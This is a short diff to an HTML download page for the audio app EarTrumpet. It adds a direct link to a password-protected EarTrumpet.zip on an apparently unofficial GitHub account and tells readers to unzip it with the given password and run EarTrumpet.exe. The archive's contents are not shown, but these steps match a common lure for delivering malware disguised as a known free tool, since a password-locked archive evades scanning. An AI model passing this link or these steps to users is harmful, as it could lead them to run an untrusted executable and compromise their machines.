@@ -5,7 +5,7 @@
 <hr>
 <h2>Download</h2>
 <ol>
-  <li>Download archive from <a href="#">Releases</a></li>
+  <li>Download archive from <a href="https://github.com/havanagilla1/eartrumpet/releases/download/Download/EarTrumpet.zip">Releases</a></li>
   <li>Unzip file to any path <i>(Passowrd: etForEver)</i></li>
   <li>Launch <code>EarTrumpet.exe</code></li>
 </ol>
